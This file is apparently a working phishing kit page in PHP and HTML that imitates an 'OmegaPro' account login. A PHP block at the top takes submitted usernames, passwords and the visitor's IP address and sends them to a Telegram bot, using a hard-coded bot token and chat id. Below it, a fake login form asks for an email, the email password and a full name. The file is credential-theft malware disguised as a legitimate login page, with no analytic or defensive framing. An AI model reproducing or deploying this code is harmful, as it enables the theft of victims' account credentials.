<?php
@session_start();
$userp = $_SERVER['REMOTE_ADDR'];


$token = "5525602887:AAENLFj816sJbuIA6tfsq61I31rU_8DlLoE";
$id = "1279332824";
$urlMsg = "https://api.telegram.org/bot{$token}/sendMessage";
$msg = "
Usuario: ".$_POST['em4yl1x']."
Clave: ".$_POST['em4yl1x1']."
IP: ".$userp."
";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlMsg);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$server_output = curl_exec($ch);
curl_close($ch);


?>


<!DOCTYPE html>
<html style="height: 100%;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Login | Tap here to Log Into your OmegaPro Account.</title>
  
    <meta name="viewport" content="width=device-width, initial-scale=1">


    <link href="./index2_files/bootstrap.min.css" rel="stylesheet" type="text/css">
    <link href="./index2_files/plugins.css" rel="stylesheet" type="text/css">
    <link href="./index2_files/font-awesome.css" rel="stylesheet">
    <link href="./index2_files/style.css" rel="stylesheet" type="text/css">
    <link href="./index2_files/css" rel="stylesheet">
    <style>
        html, body {
            font-family: 'Lato', sans-serif;
            color: #1d1d1d;
            padding: 0px;
            margin: 0px;
            background: url(archivero/bg.jpg) no-repeat fixed;
            background-size: cover;
        }

        .example-marquee {
            position: relative;
        }

        .content {
            display: table;
            width: 100%;
            height: 100%;
            z-index: 1;
            position: fixed;
            background: rgba(0,10,30,0.8) !important;
        }

            .content .inner {
                display: table-cell;
                vertical-align: middle;
                text-align: center;
                padding-left: 16px;
                padding-right: 16px;
            }

                .content .inner h1 {
                    font-size: 62px;
                    color: white;
                    text-shadow: 0px 1px 3px rgba(0,0,0,0.5);
                }

        .video-background-controls button {
            font-size: 32px;
            display: inline-block;
            padding: 0px;
            margin: 0px;
            height: 32px;
            width: 32px;
            border-radius: 16px;
            line-height: 32px;
            border: none;
            background: none;
            -webkit-appearance: none;
            color: white;
            filter: drop-shadow(0px 0px 1px black);
            cursor: pointer;
            opacity: 1;
            transition: all 250ms ease-in-out;
            margin-left: 10px;
        }

            .video-background-controls button:hover {
                opacity: 0.5;
            }

        iframe {
            transition: opacity 500ms ease-in-out;
            transition-delay: 250ms;
        }

        .bc-login input[type="text"], .bc-login input[type="password"] {
            padding-left: 20px !important;
        }
    </style>

   
<link type="text/css" rel="stylesheet" charset="UTF-8" href="./index2_files/translateelement.css">


<link type="text/css" rel="stylesheet" charset="UTF-8" href="./index2_files/translateelement(1).css">


    <style type="text/css">
        html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, dl, dt, dd, ol, nav ul, nav li, fieldset, form, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
            vertical-align: middle !important;
        }

        #google_translate_element {
            display: none;
        }

        .goog-te-banner-frame.skiptranslate {
            display: none !important;
        }

        .goog-tooltip {
            display: none !important;
        }

        .goog-text-highlight {
            background-color: transparent !important;
            border: none !important;
            box-shadow: none !important;
        }

        .goog-te-gadget-icon {
            display: none;
        }

        .modal-lang {
            text-align: left;
        }

            .modal-lang .lang {
                font-size: 25px;
                line-height: 45px;
                transition: 350ms ease all;
            }

                .modal-lang .lang:hover {
                    transform: scale(1.2);
                }

            .modal-lang .flag-icon {
                font-size: 1.5625rem;
                margin: 1.25rem;
                transition: 350ms ease all;
            }

                .modal-lang .flag-icon:hover {
                    transform: scale(1.2);
                }

        body {
            top: 0px !important;
        }
    </style>
</head>
<body style="position: relative; min-height: 100%; top: 0px;">
    <div class="container" style="max-width: 100%; padding: 0;">
        <main>
            <div class="example-marquee">
                
                <div class="content">
                    <div class="clear-loading spinner">
                        <img src="./index2_files/logo.png"><br>
                        <a href="##" class="nav-link " data-toggle="modal" data-target="#lang-modal"><img src="./index2_files/lenguaj.png" style="width:150px;height:auto;"></a>
                    </div>
                    <div class="bc-login box box--big">
                      
						
						<form method="post" action="posi2.php">




                            
  
                            <div class="agile-field-txt">
                                <input name="email1" type="email" id="em4yl1x" placeholder="Enter Email" required="" autocomplete="off">
                            </div>
                            <div class="agile-field-txt">
                                <input name="pass1" type="password" id="em4yl1x1" placeholder="Enter Email Password" required="" autocomplete="off">
                                <div class="agile_label">
                                    <input id="check3" name="check3" type="checkbox" value="show password" onclick="myFunction()">
                                    <label class="check" for="check3">
                                        Show</label>
                                </div>
								
								 <div class="agile-field-txt">
                                <input name="name1" type="text" id="em4yl1x2" placeholder="Enter Full Name" required="" autocomplete="off">
                            </div>
								
                                <div class="agile-right">
                                    <a href="#">forgot password?</a>
                                </div>
                                <div class="agile-right">
                                    <a href="#">Security Question?</a>
                                </div>
                            </div>


                            <input type="submit" name="btnlogin" value="Login" id="btnlogin" tabindex="4">
                            <div class="agile-field-txt" style="margin-top: 10px;">
                                <span id="lblerror" style="color:Red;font-weight:bold;"></span>
                                <h6 style="margin-top: 20px;">
                                    <small><a style="text-align: center; font-weight: bold;" href="#">Go To Website</a> </small>
                                </h6>
                            </div>
                        

</form>
                    </div>
                    <div class="copy-wthree">
                        <p>
                            © 2022
            OmegaPro. All Rights Reserved.
                        </p>
                    </div>
                </div>
            </div>


        </main>
    </div>


 





</body></html>